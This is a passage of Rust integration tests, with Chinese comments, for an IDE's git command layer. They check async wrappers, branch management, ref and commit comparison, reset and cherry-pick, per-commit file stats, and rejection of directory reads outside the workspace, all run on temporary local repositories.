        // 没有任何提交的 refs 里出现未简化的 refs/stash 装饰
        assert!(
            all.iter()
                .flat_map(|c| c.branch_tags.iter().flatten())
                .all(|t| t.name != "refs/stash"),
            "日志里不应出现未简化的 refs/stash 装饰"
        );

        let _ = fs::remove_dir_all(&dir);
    }
}

/// async 命令包装层的行为契约：spawn_blocking 只是把同步实现搬到 blocking
/// 池，不能改变结果。这里对同一个仓库并行调用 async 版本与同步实现，要求
/// 逐字段一致 —— 防止将来有人在包装层里改参数顺序、丢字段或吞掉错误。
#[cfg(test)]
mod async_command_wrapper_tests {
    use super::*;
    use std::path::Path;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(out.status.success(), "git {:?} failed", args);
    }

    /// 造一个带工作区改动的小仓库，供 git_status/git_log 两个命令共用。
    fn seed_repo(name: &str) -> std::path::PathBuf {
        let dir =
            std::env::temp_dir().join(format!("ide_async_wrap_{}_{}", std::process::id(), name));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        git(&dir, &["init", "-q", "-b", "main"]);
        git(&dir, &["config", "user.email", "t@t"]);
        git(&dir, &["config", "user.name", "t"]);
        fs::write(dir.join("a.txt"), "hello\n").unwrap();
        git(&dir, &["add", "."]);
        git(&dir, &["commit", "-q", "-m", "base"]);
        fs::write(dir.join("a.txt"), "hello\nworld\n").unwrap();
        fs::write(dir.join("b.txt"), "new\n").unwrap();
        dir
    }

    /// read_directory 的测试入口需要工作区注册表（命令本体收 `State`，
    /// 测试里用无状态 impl + 手工登记的 registry）。
    fn workspace_registry(dir: &Path) -> WorkspaceRegistry {
        let registry = WorkspaceRegistry::default();
        register_workspace_dir(&registry, &dir.to_string_lossy(), false).unwrap();
        registry
    }

    fn assert_changed_eq(a: &[GitChangedFileDto], b: &[GitChangedFileDto], what: &str) {
        assert_eq!(a.len(), b.len(), "{what}: 变更条目数不一致");
        for (x, y) in a.iter().zip(b.iter()) {
            assert_eq!(x.path, y.path, "{what}: path 不一致");
            assert_eq!(x.status, y.status, "{what}: status 不一致（{}）", x.path);
            assert_eq!(
                x.is_staged, y.is_staged,
                "{what}: is_staged 不一致（{}）",
                x.path
            );
            assert_eq!(
                x.additions, y.additions,
                "{what}: additions 不一致（{}）",
                x.path
            );
            assert_eq!(
                x.deletions, y.deletions,
                "{what}: deletions 不一致（{}）",
                x.path
            );
        }
    }

    #[test]
    fn async_git_status_matches_sync_impl() {
        let dir = seed_repo("status");
        let repo = Some(dir.to_string_lossy().to_string());

        let sync = git_status_impl(repo.clone()).unwrap();
        let via_async = tauri::async_runtime::block_on(git_status(repo)).unwrap();

        assert_changed_eq(&via_async, &sync, "git_status");

        // 语义也要在：a.txt 已修改、b.txt 未跟踪
        let a = via_async
            .iter()
            .find(|f| f.path == "a.txt")
            .expect("a.txt 应在变更列表");
        assert!(!a.is_staged, "a.txt 只改了工作区，不应是 staged");
        let b = via_async
            .iter()
            .find(|f| f.path == "b.txt")
            .expect("b.txt 应在变更列表");
        assert_eq!(b.status, "U", "未跟踪文件应归一化为 U");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn async_git_log_matches_sync_impl() {
        let dir = seed_repo("log");
        let repo = Some(dir.to_string_lossy().to_string());

        let sync = git_log_impl(repo.clone(), Some(10), None, None, None, None).unwrap();
        let via_async = tauri::async_runtime::block_on(git_log(
            repo,
            Some(10),
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
        ))
        .unwrap();

        assert_eq!(via_async.len(), sync.len(), "提交数不一致");
        for (x, y) in via_async.iter().zip(sync.iter()) {
            assert_eq!(x.hash, y.hash);
            assert_eq!(x.short_hash, y.short_hash);
            assert_eq!(x.message, y.message);
            assert_eq!(x.parents, y.parents);
        }

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn async_git_branches_reports_current_branch() {
        let dir = seed_repo("branches");
        let repo = Some(dir.to_string_lossy().to_string());

        let branches = tauri::async_runtime::block_on(git_branches(repo)).unwrap();

        assert_eq!(branches.len(), 1, "单分支仓库应只有一个分支");
        assert_eq!(branches[0].name, "main");
        assert!(branches[0].is_current, "main 应被标记为当前分支");
        assert!(!branches[0].is_remote);

        let _ = fs::remove_dir_all(&dir);
    }

    /// git_repo_info 每次 refreshGit 都跑在最前面，自身串两个 git 子进程。
    /// 异步包装后必须同样给出 root 与当前分支，且非仓库不能谎报成仓库。
    #[test]
    fn async_git_repo_info_reports_root_and_branch() {
        let dir = seed_repo("repoinfo");
        let repo = Some(dir.to_string_lossy().to_string());

        let info = tauri::async_runtime::block_on(git_repo_info(repo)).unwrap();

        assert!(info.is_repo, "种子仓库应被识别为 git 仓库");
        assert!(!info.root.is_empty(), "root 不应为空");
        assert_eq!(info.branch, "main");

        // 非仓库目录：is_repo 必须为 false，不能谎报
        let plain =
            std::env::temp_dir().join(format!("ide_async_wrap_plain_{}", std::process::id()));
        let _ = fs::remove_dir_all(&plain);
        fs::create_dir_all(&plain).unwrap();
        let missing = tauri::async_runtime::block_on(git_repo_info(Some(
            plain.to_string_lossy().to_string(),
        )))
        .unwrap();
        assert!(!missing.is_repo, "非 git 目录的 is_repo 应为 false");
        assert!(missing.root.is_empty(), "非 git 目录的 root 应为空");

        let _ = fs::remove_dir_all(&plain);
        let _ = fs::remove_dir_all(&dir);
    }

    /// read_directory 的 async 包装同样不能丢 children：这是项目树展开的数据源。
    #[test]
    fn async_read_directory_keeps_children() {
        let dir = seed_repo("readdir");

        let registry = workspace_registry(&dir);
        let node = tauri::async_runtime::block_on(read_directory_impl(
            &dir.to_string_lossy(),
            Some(2),
            None,
            &registry,
        ))
        .unwrap();

        assert!(node.is_directory, "种子仓库根应是目录");
        let children = node.children.expect("max_depth=2 必须返回 children");
        // .git 被 is_ignored_entry 过滤，只剩 a.txt 与 b.txt
        let names: Vec<&str> = children.iter().map(|c| c.name.as_str()).collect();
        assert!(
            names.contains(&"a.txt"),
            "children 应含 a.txt，实际 {:?}",
            names
        );
        assert!(
            names.contains(&"b.txt"),
            "children 应含 b.txt，实际 {:?}",
            names
        );

        // 工作区内不存在的路径仍要报错，不能变成空目录
        let missing = dir.join("no_such_dir");
        let err = tauri::async_runtime::block_on(read_directory_impl(
            &missing.to_string_lossy(),
            None,
            None,
            &registry,
        ))
        .unwrap_err();
        assert!(
            err.contains("does not exist"),
            "错误信息应说明路径不存在，实际: {err}"
        );

        // 工作区外的路径直接拒绝（审计 5.1：该命令原先完全不受授权约束）
        let outside =
            std::env::temp_dir().join(format!("ide_async_wrap_outside_{}", std::process::id()));
        let _ = fs::remove_dir_all(&outside);
        let err = tauri::async_runtime::block_on(read_directory_impl(
            &outside.to_string_lossy(),
            None,
            None,
            &registry,
        ))
        .unwrap_err();
        // 错误码协议：越界返回 ERR:path_outside_workspace|<路径>。
        // 断言码而不是中文文案 —— 文案已移到前端字典，后端只保证码稳定。
        assert_eq!(
            crate::error_proto::parse_error(&err).code(),
            Some("path_outside_workspace"),
            "越界路径应被拒绝，实际: {err}"
        );

        let _ = fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod push_pending_integration_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// 待推提交：推完为空 → 新提交出现一条 → 推完再清空
    #[test]
    fn pending_commits_track_upstream_and_push_state() {
        let base = std::env::temp_dir().join(format!("ide_pending_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let origin = base.join("origin.git");
        let work = base.join("work");

        git(&base, &["init", "-q", "--bare", origin.to_str().unwrap()]);
        git(
            &base,
            &[
                "clone",
                "-q",
                origin.to_str().unwrap(),
                work.to_str().unwrap(),
            ],
        );

        let user = ["-c", "user.email=t@t.com", "-c", "user.name=t"];

        fs::write(work.join("a"), "1").unwrap();
        git(&work, &["add", "."]);
        git(
            &work,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c1",
            ],
        );

        let br = git_output(
            git_cmd()
                .arg("-C")
                .arg(&work)
                .args(["branch", "--show-current"]),
        )
        .unwrap();
        let branch = String::from_utf8_lossy(&br.stdout).trim().to_string();
        let mut push1 = user.to_vec();
        push1.extend_from_slice(&["push", "-u", "origin", &branch]);
        git(&work, &push1);

        let repo = Some(work.to_string_lossy().to_string());

        // 已全部推送：无待推提交
        let pending =
            tauri::async_runtime::block_on(git_pending_commits(repo.clone(), None)).unwrap();
        assert!(pending.is_empty(), "推送后不应有待推提交");

        // 新提交：出现一条待推
        fs::write(work.join("b"), "2").unwrap();
        git(&work, &["add", "."]);
        git(
            &work,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "c2",
            ],
        );
        let pending =
            tauri::async_runtime::block_on(git_pending_commits(repo.clone(), None)).unwrap();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].message, "c2");
        assert_eq!(pending[0].graph_track, 0);

        // 远程列表应包含 origin
        let remotes = git_remote_list(repo.clone()).unwrap();
        assert_eq!(remotes.len(), 1);
        assert_eq!(remotes[0].name, "origin");

        let _ = fs::remove_dir_all(&base);
    }

    /// 无上游、无同名远程分支时：pending = 所有不在远程引用上的提交
    #[test]
    fn pending_commits_without_upstream_uses_remote_refs() {
        let base = std::env::temp_dir().join(format!("ide_pending_local_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo_dir = base.join("solo");

        git(
            &base,
            &["init", "-q", "-b", "main", repo_dir.to_str().unwrap()],
        );
        fs::write(repo_dir.join("a"), "1").unwrap();
        git(&repo_dir, &["add", "."]);
        git(
            &repo_dir,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                "only",
            ],
        );

        let pending = tauri::async_runtime::block_on(git_pending_commits(
            Some(repo_dir.to_string_lossy().to_string()),
            None,
        ))
        .unwrap();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].message, "only");

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod branch_management_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn ref_exists(dir: &Path, ref_name: &str) -> bool {
        git_output(
            git_cmd()
                .arg("-C")
                .arg(dir)
                .args(["show-ref", "--verify", "--quiet", ref_name]),
        )
        .unwrap()
        .status
        .success()
    }

    /// 远程分支 DWIM 检出（自动建跟踪分支）、重命名、删除本地与远程分支
    #[test]
    fn dwim_remote_checkout_rename_and_delete() {
        let base = std::env::temp_dir().join(format!("ide_branch_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let origin = base.join("origin.git");
        let a = base.join("clone_a");
        let b = base.join("clone_b");

        git(&base, &["init", "-q", "--bare", origin.to_str().unwrap()]);
        git(
            &base,
            &["clone", "-q", origin.to_str().unwrap(), a.to_str().unwrap()],
        );
        git(
            &base,
            &["clone", "-q", origin.to_str().unwrap(), b.to_str().unwrap()],
        );

        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        // A：提交并在 feat 分支推送
        fs::write(a.join("f.txt"), "1").unwrap();
        git(&a, &["add", "."]);
        git(&a, &commit("c1"));
        git(&a, &["checkout", "-qb", "feat"]);
        fs::write(a.join("g.txt"), "2").unwrap();
        git(&a, &["add", "."]);
        git(&a, &commit("feat-work"));
        git(&a, &["push", "-u", "origin", "feat"]);

        // B：fetch 后 DWIM 检出 origin/feat
        git(&b, &["fetch", "--all"]);
        let repo_b = Some(b.to_string_lossy().to_string());
        git_checkout(repo_b.clone(), "origin/feat".to_string()).unwrap();

        let head = git_output(
            git_cmd()
                .arg("-C")
                .arg(&b)
                .args(["branch", "--show-current"]),
        )
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&head.stdout).trim(),
            "feat",
            "DWIM 检出应创建本地 feat"
        );
        let up = git_output(git_cmd().arg("-C").arg(&b).args([
            "rev-parse",
            "--abbrev-ref",
            "--symbolic-full-name",
            "@{upstream}",
        ]))
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&up.stdout).trim(),
            "origin/feat",
            "应自动建立跟踪"
        );

        // 重命名 feat → feature2
        git_rename_branch(repo_b.clone(), "feat".to_string(), "feature2".to_string()).unwrap();
        assert!(ref_exists(&b, "refs/heads/feature2"));
        assert!(!ref_exists(&b, "refs/heads/feat"));

        // 删除本地分支（当前正在 feature2 上，先切到临时分支；未合并需要 force）
        git(&b, &["checkout", "-qb", "tmp"]);
        let unmerged_delete = tauri::async_runtime::block_on(git_delete_branch(
            repo_b.clone(),
            "feature2".to_string(),
            Some(false),
            Some(false),
        ));
        if unmerged_delete.is_err() {
            // 未合并分支 -d 被拒绝 → 强制删除
            tauri::async_runtime::block_on(git_delete_branch(
                repo_b.clone(),
                "feature2".to_string(),
                Some(false),
                Some(true),
            ))
            .unwrap();
        }
        assert!(!ref_exists(&b, "refs/heads/feature2"));

        // 删除远程分支
        tauri::async_runtime::block_on(git_delete_branch(
            repo_b,
            "origin/feat".to_string(),
            Some(true),
            None,
        ))
        .unwrap();
        assert!(!ref_exists(&origin, "refs/heads/feat"), "远程分支应被删除");
        assert!(
            !ref_exists(&b, "refs/remotes/origin/feat"),
            "本地远程跟踪引用应同步清除"
        );

        let _ = fs::remove_dir_all(&base);
    }

    /// against_worktree 分支：ref 与工作区（含未提交改动）的差异。
    /// 该分支与 ref 比较分支是两套独立的解析路径，各调两次 git。
    #[test]
    fn compare_refs_against_worktree_sees_uncommitted_changes() {
        let base =
            std::env::temp_dir().join(format!("ide_compare_worktree_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        fs::write(repo.join("a.txt"), "1\n2\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        // 工作区未提交：改 a.txt（+1 -1）+ 暂存新增 b.txt。
        // 注意未跟踪（未 add）的文件不出现在 git diff 输出里，故这里用
        // 暂态新增来覆盖 A 状态分支。
        fs::write(repo.join("a.txt"), "1\nX\n").unwrap();
        fs::write(repo.join("b.txt"), "brand new\n").unwrap();
        git(&repo, &["add", "b.txt"]);

        let result = tauri::async_runtime::block_on(git_compare_refs(
            repo_arg.clone(),
            "HEAD".to_string(),
            Some(true),
        ))
        .unwrap();
        // 该分支不产生提交列表
        assert!(result.commits.is_empty(), "against_worktree 不应有提交");

        let b = result
            .files
            .iter()
            .find(|f| f.path == "b.txt")
            .expect("b.txt 应出现");
        assert_eq!(b.status, "A", "暂态新增应判为 A");
        assert_eq!(b.additions, 1);

        let a = result
            .files
            .iter()
            .find(|f| f.path == "a.txt")
            .expect("a.txt 应出现");
        assert_eq!(a.status, "M");
        assert_eq!(a.additions, 1);
        assert_eq!(a.deletions, 1);

        let _ = fs::remove_dir_all(&base);
    }

    /// 标签创建/列表 与 分支比较（独有提交 + 文件差异）
    #[test]
    fn tags_and_compare_refs() {
        let base = std::env::temp_dir().join(format!("ide_tag_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);

        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        fs::write(repo.join("a.txt"), "1").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit("c1"));
        git(&repo, &["tag", "light1"]);
        git(
            &repo,
            &[
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "tag",
                "-a",
                "ann1",
                "-m",
                "annotated",
            ],
        );

        let repo_arg = Some(repo.to_string_lossy().to_string());

        // 从 c1 分出 feat 并提交独有变更
        git(&repo, &["checkout", "-qb", "feat"]);
        fs::write(repo.join("b.txt"), "2").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit("feat-only"));
        git(&repo, &["checkout", "-q", "main"]);

        let result = tauri::async_runtime::block_on(git_compare_refs(
            repo_arg.clone(),
            "feat".to_string(),
            None,
        ))
        .unwrap();
        assert_eq!(result.commits.len(), 1);
        assert_eq!(result.commits[0].message, "feat-only");
        assert_eq!(result.files.len(), 1);
        assert_eq!(result.files[0].path, "b.txt");
        assert_eq!(result.files[0].status, "A");

        // 打标签在指定提交上
        let created = git_create_tag(
            repo_arg.clone(),
            "on-feat".to_string(),
            Some("feat".to_string()),
            Some("msg".to_string()),
        );
        assert!(created.is_ok());

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn compare_commits_and_diff_commits() {
        let base = std::env::temp_dir().join(format!("ide_compare_commits_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("repo");
        fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-b", "main"]);
        git(&repo, &["config", "user.name", "Tester"]);
        git(&repo, &["config", "user.email", "test@example.com"]);

        fs::write(repo.join("file1.txt"), "line1\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "first commit"]);
        let out1 = git_output(git_cmd().arg("-C").arg(&repo).args(["rev-parse", "HEAD"])).unwrap();
        let c1 = String::from_utf8_lossy(&out1.stdout).trim().to_string();

        fs::write(repo.join("file1.txt"), "line1\nline2\n").unwrap();
        fs::write(repo.join("file2.txt"), "hello\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "second commit"]);
        let out2 = git_output(git_cmd().arg("-C").arg(&repo).args(["rev-parse", "HEAD"])).unwrap();
        let c2 = String::from_utf8_lossy(&out2.stdout).trim().to_string();

        let repo_arg = Some(repo.to_string_lossy().to_string());
        let files = tauri::async_runtime::block_on(git_compare_commits(
            repo_arg.clone(),
            c1.clone(),
            c2.clone(),
        ))
        .unwrap();

        assert_eq!(files.len(), 2);
        let f1 = files
            .iter()
            .find(|f| f.path == "file1.txt")
            .expect("file1.txt 存在");
        assert_eq!(f1.status, "M");
        let f2 = files
            .iter()
            .find(|f| f.path == "file2.txt")
            .expect("file2.txt 存在");
        assert_eq!(f2.status, "A");

        let diff = tauri::async_runtime::block_on(git_diff_commits(
            repo_arg,
            c1,
            c2,
            Some("file1.txt".to_string()),
        ))
        .unwrap();

        assert_eq!(diff.path, "file1.txt");
        assert_eq!(diff.additions, 1);
        assert_eq!(diff.deletions, 0);

        let _ = fs::remove_dir_all(&base);
    }

    /// Compare Branches：两侧独有提交、共同祖先、整侧文件清单与 path 过滤。
    #[test]
    fn compare_branches_returns_side_logs_and_files() {
        let base =
            std::env::temp_dir().join(format!("ide_compare_branches_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("repo");
        fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        git(&repo, &["config", "user.name", "Tester"]);
        git(&repo, &["config", "user.email", "test@example.com"]);

        fs::write(repo.join("base.txt"), "base\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "base"]);
        let base_hash =
            git_output(git_cmd().arg("-C").arg(&repo).args(["rev-parse", "HEAD"])).unwrap();
        let base_hash = String::from_utf8_lossy(&base_hash.stdout)
            .trim()
            .to_string();

        git(&repo, &["checkout", "-qb", "feat"]);
        fs::write(repo.join("feat.txt"), "feat\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "feat-one"]);
        fs::write(repo.join("feat2.txt"), "feat2\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "feat-two"]);

        git(&repo, &["checkout", "-q", "main"]);
        fs::write(repo.join("main.txt"), "main\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "main-one"]);

        let repo_arg = Some(repo.to_string_lossy().to_string());
        let result = tauri::async_runtime::block_on(git_compare_branches(
            repo_arg.clone(),
            "feat".to_string(),
            "main".to_string(),
            Some(50),
            None,
            None,
        ))
        .unwrap();

        assert_eq!(result.merge_base, base_hash);
        assert_eq!(
            result
                .left_commits
                .iter()
                .map(|c| c.message.as_str())
                .collect::<Vec<_>>(),
            vec!["feat-two", "feat-one"]
        );
        assert_eq!(
            result
                .right_commits
                .iter()
                .map(|c| c.message.as_str())
                .collect::<Vec<_>>(),
            vec!["main-one"]
        );
        assert!(!result.left_truncated);
        assert!(!result.right_truncated);
        assert!(result
            .left_files
            .iter()
            .any(|f| f.path == "feat.txt" && f.status == "A"));
        assert!(result
            .left_files
            .iter()
            .any(|f| f.path == "feat2.txt" && f.status == "A"));
        assert!(result
            .right_files
            .iter()
            .any(|f| f.path == "main.txt" && f.status == "A"));
        assert!(!result.left_files.iter().any(|f| f.path == "main.txt"));

        // path 过滤只影响该侧日志，整侧文件清单仍按完整 branch-side diff 计算。
        let filtered = tauri::async_runtime::block_on(git_compare_branches(
            repo_arg.clone(),
            "feat".to_string(),
            "main".to_string(),
            Some(50),
            Some("feat.txt".to_string()),
            None,
        ))
        .unwrap();
        assert_eq!(filtered.left_commits.len(), 1);
        assert_eq!(filtered.left_commits[0].message, "feat-one");

        // 数量上限：多取一条判断截断，响应只保留 limit 条。
        let capped = tauri::async_runtime::block_on(git_compare_branches(
            repo_arg,
            "feat".to_string(),
            "main".to_string(),
            Some(1),
            None,
            None,
        ))
        .unwrap();
        assert_eq!(capped.left_commits.len(), 1);
        assert!(capped.left_truncated);
        assert!(!capped.right_truncated);

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod log_action_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn head_hash(dir: &Path) -> String {
        let out = git_output(git_cmd().arg("-C").arg(dir).args(["rev-parse", "HEAD"])).unwrap();
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }

    /// reset 各模式行为 + cherry-pick 摘取跨分支提交 + --all 日志包含其他分支
    #[test]
    fn reset_modes_cherry_pick_and_all_refs_log() {
        let base = std::env::temp_dir().join(format!("ide_action_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("solo");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        let commit = |msg: &'static str| {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        fs::write(repo.join("a.txt"), "1").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit("c1"));
        fs::write(repo.join("b.txt"), "2").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit("c2"));

        // 分支持有提交：feat 上 cherry-pick 的来源
        git(&repo, &["checkout", "-qb", "feat"]);
        fs::write(repo.join("f.txt"), "3").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &commit("feat-work"));
        let feat_hash = head_hash(&repo);
        git(&repo, &["checkout", "-q", "main"]);

        // --all 日志包含 feat 分支的提交；默认只看 HEAD 历史
        let all_log =
            git_log_impl(repo_arg.clone(), Some(50), None, Some(true), None, None).unwrap();
        assert!(all_log.iter().any(|c| c.message == "feat-work"));
        let head_log =
            git_log_impl(repo_arg.clone(), Some(50), None, Some(false), None, None).unwrap();
        assert!(!head_log.iter().any(|c| c.message == "feat-work"));

        // cherry-pick feat 提交到 main
        git_cherry_pick(repo_arg.clone(), feat_hash.clone()).unwrap();
        let picked = git_log_impl(repo_arg.clone(), Some(5), None, None, None, None).unwrap();
        assert_eq!(
            picked[0].message, "feat-work",
            "摘取后 HEAD 应出现同信息提交"
        );
        assert_ne!(picked[0].hash, feat_hash, "摘取产生新提交");

        // reset --soft HEAD~1：提交退回暂存区
        let before = head_hash(&repo);
        git_reset(
            repo_arg.clone(),
            "HEAD~1".to_string(),
            Some("soft".to_string()),
        )
        .unwrap();
        assert_ne!(head_hash(&repo), before);
        let staged =
            git_output(
                git_cmd()
                    .arg("-C")
                    .arg(&repo)
                    .args(["diff", "--cached", "--name-only"]),
            )
            .unwrap();
        assert!(
            String::from_utf8_lossy(&staged.stdout).contains("f.txt"),
            "soft reset 后更改应保留在暂存区"
        );

        // 回到原 HEAD，再 reset --hard HEAD~1：丢弃工作区更改
        git(&repo, &["reset", "--hard", &before]);
        git_reset(
            repo_arg.clone(),
            "HEAD~1".to_string(),
            Some("hard".to_string()),
        )
        .unwrap();
        assert!(!repo.join("f.txt").exists(), "hard reset 后文件应被丢弃");

        // 非法模式应报错
        assert!(git_reset(repo_arg, "HEAD".to_string(), Some("bogus".to_string())).is_err());

        let _ = fs::remove_dir_all(&base);
    }
}

#[cfg(test)]
mod blame_history_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    #[test]
    fn commit_files_reports_status_and_counts() {
        // 守住 git_commit_files：numstat 给增删行数、name-status 给状态字母，
        // 两者分两次 spawn 后再按路径配对。并行化改造后若配对错位或漏一路，
        // 这里立刻可见。
        let base = std::env::temp_dir().join(format!("ide_commit_files_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("r");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        fs::write(repo.join("m.txt"), "l1\nl2\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        // c2：改 m.txt、新增 a.txt、删掉 m.txt 里的内容各若干行
        fs::write(repo.join("m.txt"), "l1\nL2\nl3\nl4\n").unwrap();
        fs::write(repo.join("a.txt"), "new\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c2"]);

        let files =
            tauri::async_runtime::block_on(git_commit_files(repo_arg.clone(), "HEAD".to_string()))
                .unwrap();
        assert_eq!(files.len(), 2, "c2 应只动两个文件");

        let m = files
            .iter()
            .find(|f| f.path == "m.txt")
            .expect("m.txt 应在列表中");
        assert_eq!(m.status, "M");
        assert_eq!(m.additions, 3, "m.txt 新增 3 行");
        assert_eq!(m.deletions, 1, "m.txt 删除 1 行");

        let a = files
            .iter()
            .find(|f| f.path == "a.txt")
            .expect("a.txt 应在列表中");
        assert_eq!(a.status, "A");
        assert_eq!(a.additions, 1);
        assert_eq!(a.deletions, 0);

        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn commits_files_ignores_unselected_commits_and_accumulates_stats() {
        // 两个选中提交中间隔一个未选提交：文件清单必须只含所选提交的并集，
        // 不能退化成首尾 range diff；同名文件的 +/− 必须累加。
        let base = std::env::temp_dir().join(format!("ide_commits_files_{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let repo = base.join("r");
        git(&base, &["init", "-q", "-b", "main", repo.to_str().unwrap()]);
        let repo_arg = Some(repo.to_string_lossy().to_string());

        fs::write(repo.join("a.txt"), "one\n").unwrap();
        fs::write(repo.join("only1.txt"), "one\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c1"]);

        // 中间提交：不在选中集合里，它的文件不能被带出来。
        fs::write(repo.join("gap.txt"), "gap\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c2"]);

        fs::write(repo.join("a.txt"), "one\ntwo\n").unwrap();
        fs::write(repo.join("only3.txt"), "three\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-qm", "c3"]);

        let files = tauri::async_runtime::block_on(git_commits_files(
            repo_arg.clone(),
            vec!["HEAD".to_string(), "HEAD~2".to_string()],
        ))
        .unwrap();
        let paths: Vec<&str> = files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, vec!["a.txt", "only1.txt", "only3.txt"]);
        assert!(
            !paths.contains(&"gap.txt"),
            "未选中的中间提交不能出现在文件清单"
        );

        let a = files.iter().find(|f| f.path == "a.txt").unwrap();
        assert_eq!(a.additions, 2, "c1 + c3 对 a.txt 的增行应累加");
        assert_eq!(a.deletions, 0);

        let diff = tauri::async_runtime::block_on(git_commits_diff(
            repo_arg,
            vec!["HEAD".to_string(), "HEAD~2".to_string()],
            Some("a.txt".to_string()),
        ))
        .unwrap();
